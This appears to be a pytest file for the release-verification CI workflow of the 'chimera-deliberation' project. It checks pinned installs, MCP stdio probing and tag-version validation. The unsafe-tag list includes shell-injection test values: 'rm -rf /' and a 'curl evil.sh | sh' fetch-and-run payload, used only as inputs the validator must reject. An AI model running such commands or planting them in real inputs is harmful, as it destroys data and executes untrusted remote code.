"""Offline regression tests for the tag-release verification workflow — DF-CHIMERA-0911-2.

The release-verify job in .github/workflows/ci.yml is the last gate before a
tagged release is considered good. It previously installed the UNPINNED
package (``pip install "chimera-deliberation[full]"`` — which can resolve a
newer/wrong version than the tag that triggered the run) and its MCP check
was a handshake-only ``... | head -1 | grep serverInfo`` that falsely passed
the published 0.2.3 wheel, whose lazy LiteLLM stdout pollution only begins
on a real tools/call.

These tests pin the workflow contract OFFLINE — no GitHub runner, no PyPI,
no provider keys:

* the install is exact-version pinned (``==${VERSION}``) from the tag, in a
  fresh venv, behind a BOUNDED retry that cannot fall through to another
  version, with a post-install ``chimera.__version__ == VERSION`` assertion;
* the MCP gate drives scripts/probe_mcp_stdio.py against the fresh venv's
  chimera-mcp at real tools/call depth for BOTH gate formations
  (simple + speed), and no head -1 / serverInfo handshake survives;
* the fresh-user journey (config init + real CLI run with the deterministic
  GATE-OK merged-answer assertion) is intact;
* the 0.2.3 lazy-pollution shape is replayed through the probe's real
  validators: the OLD shallow gate accepts it, the NEW gate rejects it;
* scripts/release_expected_version.py derives/validates the version offline.
"""

from __future__ import annotations

import importlib.util
import json
import re
import sys
from pathlib import Path
from types import ModuleType

import pytest
import yaml

REPO = Path(__file__).resolve().parent.parent
WORKFLOW_PATH = REPO / ".github" / "workflows" / "ci.yml"
PROBE_PATH = REPO / "scripts" / "probe_mcp_stdio.py"
VERSION_SCRIPT_PATH = REPO / "scripts" / "release_expected_version.py"


def _load_module(name: str, path: Path) -> ModuleType:
    """Load a script as a module (scripts/ is not a package)."""
    spec = importlib.util.spec_from_file_location(name, path)
    assert spec is not None and spec.loader is not None
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


probe = _load_module("probe_mcp_stdio", PROBE_PATH)
release_version = _load_module("release_expected_version", VERSION_SCRIPT_PATH)


@pytest.fixture(scope="module")
def workflow() -> dict:
    with WORKFLOW_PATH.open(encoding="utf-8") as fh:
        doc = yaml.safe_load(fh)
    assert isinstance(doc, dict), "ci.yml must parse as a mapping"
    return doc


@pytest.fixture(scope="module")
def release_verify_steps(workflow: dict) -> list[dict]:
    job = workflow["jobs"]["release-verify"]
    assert job["needs"] == "publish", "release-verify must run only after publish"
    assert "refs/tags/v" in job["if"], "release-verify must be tag-triggered"
    return job["steps"]


@pytest.fixture(scope="module")
def release_verify_run_blocks(release_verify_steps: list[dict]) -> str:
    """All run blocks of release-verify, concatenated for contract greps."""
    return "\n".join(step.get("run", "") for step in release_verify_steps)


# --- exact-version pinning -------------------------------------------------- #


def test_install_is_exact_version_pinned(release_verify_run_blocks: str) -> None:
    """The published artifact is installed as ==$VERSION, never unpinned."""
    assert 'chimera-deliberation[full]==${VERSION}' in release_verify_run_blocks
    # No bare/unpinned install of the package may survive anywhere in the job.
    unpinned = re.findall(r'pip install\s+"chimera-deliberation\[full\]"', release_verify_run_blocks)
    assert not unpinned, f"unpinned install survived: {unpinned}"


def test_version_derived_from_tag_via_validating_script(release_verify_run_blocks: str) -> None:
    """VERSION comes from the tag through the validating helper, not raw ref."""
    derive = 'VERSION=$(python scripts/release_expected_version.py "${GITHUB_REF_NAME}")'
    assert derive in release_verify_run_blocks
    assert 'echo "VERSION=${VERSION}" >> "$GITHUB_ENV"' in release_verify_run_blocks


def test_post_install_asserts_imported_version_equals_tag(release_verify_run_blocks: str) -> None:
    """Belt-and-braces: the imported package version must BE the tag version."""
    assert "chimera.__version__" in release_verify_run_blocks
    assert "== '${VERSION}'" in release_verify_run_blocks


# --- bounded publish-availability retry -------------------------------------- #


def test_install_retry_is_bounded_and_cannot_fall_through(release_verify_run_blocks: str) -> None:
    """Retry loop is finite, sleeps between attempts, and fails loudly."""
    match = re.search(r"for attempt in \$\(seq 1 (\d+)\)", release_verify_run_blocks)
    assert match, "install step must retry via a bounded seq loop"
    attempts = int(match.group(1))
    assert 1 < attempts <= 40, f"retry bound {attempts} must be finite and sane"
    assert re.search(r"sleep \d+", release_verify_run_blocks), "retry loop must sleep between attempts"
    # After the loop, an unmet install is a hard failure — never a silent pass.
    assert "never became installable" in release_verify_run_blocks
    assert "exit 1" in release_verify_run_blocks
    # The pinned requirement appears INSIDE the loop (every attempt exact).
    loop = release_verify_run_blocks[match.start() :]
    loop = loop[: loop.index("done")]
    assert 'chimera-deliberation[full]==${VERSION}' in loop


# --- deep MCP probe invocation ----------------------------------------------- #


def test_mcp_gate_uses_deep_probe_against_fresh_venv(release_verify_run_blocks: str) -> None:
    """The MCP gate runs the real-depth probe on the installed artifact."""
    assert "python scripts/probe_mcp_stdio.py" in release_verify_run_blocks
    assert "/tmp/release-venv/bin/chimera-mcp" in release_verify_run_blocks


def test_mcp_gate_probes_both_gate_formations(release_verify_run_blocks: str) -> None:
    """The 0.2.3 leak was formation-dependent — simple AND speed are probed."""
    mcp_bin = "/tmp/release-venv/bin/chimera-mcp"
    simple = re.search(rf"probe_mcp_stdio\.py --formation=simple {mcp_bin}", release_verify_run_blocks)
    speed = re.search(rf"probe_mcp_stdio\.py --formation=speed {mcp_bin}", release_verify_run_blocks)
    assert simple, "probe must run with --formation=simple"
    assert speed, "probe must run with --formation=speed (the 0.2.3 leaky leg)"


def test_no_shallow_handshake_survives(release_verify_run_blocks: str) -> None:
    """The falsely-green 0.2.3-era handshake check must be gone."""
    assert "head -1" not in release_verify_run_blocks
    assert "serverInfo" not in release_verify_run_blocks


def test_mcp_gate_carries_provider_keys(release_verify_steps: list[dict]) -> None:
    """A real tools/call needs a provider key in the step env."""
    probe_steps = [s for s in release_verify_steps if "probe_mcp_stdio" in s.get("run", "")]
    assert probe_steps, "no probe step found"
    env = probe_steps[0].get("env", {})
    assert "DEEPSEEK_API_KEY" in env


# --- fresh-user journey ------------------------------------------------------- #


def test_fresh_user_journey_is_intact(release_verify_run_blocks: str) -> None:
    """config init + a real CLI deliberation with a deterministic assertion."""
    assert "/tmp/release-venv/bin/chimera config init" in release_verify_run_blocks
    assert "test -f chimera.yaml" in release_verify_run_blocks
    assert '/tmp/release-venv/bin/chimera run "Reply with exactly: GATE-OK"' in release_verify_run_blocks
    assert 'grep -q "GATE-OK" /tmp/gate_run.out' in release_verify_run_blocks


# --- 0.2.3 lazy-pollution replay ---------------------------------------------- #

_INIT_RESPONSE = json.dumps(
    {
        "jsonrpc": "2.0",
        "id": 1,
        "result": {
            "protocolVersion": "2025-03-26",
            "capabilities": {"tools": {}},
            "serverInfo": {"name": "chimera-mcp", "version": "0.2.3"},
        },
    }
)
_TOOLS_RESPONSE = json.dumps(
    {
        "jsonrpc": "2.0",
        "id": 2,
        "result": {
            "tools": [
                {"name": "chimera_deliberate"},
                {"name": "chimera_formations"},
                {"name": "chimera_models"},
            ]
        },
    }
)
_DEPTH_RESPONSE = json.dumps(
    {
        "jsonrpc": "2.0",
        "id": 3,
        "result": {"content": [{"type": "text", "text": json.dumps({"answer": "17 * 23 = 391"})}]},
    }
)
#: The banner LiteLLM printed to stdout on the OpenRouter leg in the 0.2.3
#: wheel — AFTER a clean handshake, only once a real deliberation ran.
_LITELLM_BANNER = "\x1b[1;36mProvider List: https://docs.litellm.ai/docs/providers\x1b[0m"


def _old_shallow_gate_passes(stdout_lines: list[str]) -> bool:
    """Replay the 0.2.3-era check: first stdout line greps serverInfo."""
    return bool(stdout_lines) and '"serverInfo"' in stdout_lines[0]


def test_023_shape_fools_the_old_gate_but_fails_the_new_one() -> None:
    """The known 0.2.3 lazy-pollution shape: handshake pure, depth polluted.

    The old initialize-only gate ACCEPTS this transcript; the probe's real
    validators REJECT it — this is the failure signal the release canary
    must produce on any lazy stdout pollution.
    """
    polluted_at_depth = [_INIT_RESPONSE, _TOOLS_RESPONSE, _LITELLM_BANNER, _DEPTH_RESPONSE]

    assert _old_shallow_gate_passes(polluted_at_depth), (
        "premise broken: the old head -1 | grep serverInfo gate should ACCEPT this 0.2.3 transcript"
    )

    order, responses = probe.collect_responses(polluted_at_depth)
    problems = probe.check_handshake(polluted_at_depth, order, responses)
    depth_problems, _ = probe.check_depth_result(responses.get(3, {}).get("result", {}))
    problems.extend(depth_problems)
    assert problems, "the deep probe must REJECT the 0.2.3 lazy-pollution transcript"
    assert any("non-JSON-RPC stdout lines" in p for p in problems), (
        f"expected a stdout-pollution finding, got: {problems}"
    )


def test_probe_clean_transcript_passes_both_validators() -> None:
    """Control: a pure transcript (what a fixed wheel emits) passes cleanly."""
    clean = [_INIT_RESPONSE, _TOOLS_RESPONSE, _DEPTH_RESPONSE]
    assert _old_shallow_gate_passes(clean)
    order, responses = probe.collect_responses(clean)
    problems = probe.check_handshake(clean, order, responses)
    depth_problems, _ = probe.check_depth_result(responses.get(3, {}).get("result", {}))
    problems.extend(depth_problems)
    assert problems == [], f"clean transcript must pass, got: {problems}"


# --- release_expected_version.py contract ------------------------------------- #


def test_derive_version_strips_v_and_validates() -> None:
    assert release_version.derive_version("v0.2.5") == "0.2.5"
    assert release_version.derive_version("v1.0.0rc1") == "1.0.0rc1"


@pytest.mark.parametrize(
    "bad_tag",
    [
        "0.2.5",  # missing v prefix
        "v",  # empty version
        "v0.2.5; rm -rf /",  # shell injection
        'v0.2.5" && curl evil.sh | sh #',  # quote breakout
        "v0.2.5 || true",  # command chaining
        "vlatest",  # not a version
        "v0.2.5+local",  # local segment not accepted
        "",  # empty tag
    ],
)
def test_derive_version_rejects_unsafe_tags(bad_tag: str) -> None:
    with pytest.raises(ValueError):
        release_version.derive_version(bad_tag)


def test_expected_version_matches_this_repo_pyproject() -> None:
    """The tag built from pyproject's own version must round-trip."""
    declared = release_version.pyproject_version(REPO / "pyproject.toml")
    assert release_version.is_safe_pep440(declared)
    assert release_version.expected_version(f"v{declared}") == declared


def test_expected_version_rejects_tag_pyproject_mismatch(tmp_path: Path) -> None:
    """A tag that doesn't match the declared version is a hard failure."""
    fake = tmp_path / "pyproject.toml"
    fake.write_text('[project]\nname = "chimera-deliberation"\nversion = "9.9.9"\n', encoding="utf-8")
    declared = release_version.pyproject_version(REPO / "pyproject.toml")
    with pytest.raises(ValueError, match="does not match|declares"):
        release_version.expected_version(f"v{declared}", fake)
